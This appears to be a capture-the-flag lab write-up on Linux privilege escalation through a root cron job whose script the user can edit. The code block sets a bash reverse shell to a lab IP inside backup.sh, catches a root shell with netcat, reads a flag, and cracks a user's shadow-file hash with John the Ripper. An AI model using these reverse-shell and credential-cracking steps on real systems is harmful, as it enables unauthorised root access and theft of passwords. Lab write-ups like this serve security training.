Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
  
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.  
  
Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.
```
# Login to the remote server using provided credentials.
# Run below command to look for cronjobs and found out that basckup.sh script was configured to run every minute.
cat /etc/crontab

# We modified the backup.sh as follows to receive reverse shell on our system with root privilegs.
cat backup.sh
#!/bin/bash

bash -i >& /dev/tcp/10.201.22.135/5555 0>&1

# Then start listener on system and we receive reverse shell as root
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.201.111.104 54582
bash: cannot set terminal process group (12985): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-201-111-104:~# whoami
whoami
root

# Then we simply search for flag using find command
find / -name flag*

# Executed flag.
cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-383000283

# To find out password of user matt, we execute shadow file and cracked the hashed password using hashes.com. We can crack the password using john by simply copying the hash to file and run it using below command.
john hash
matt - 123456
```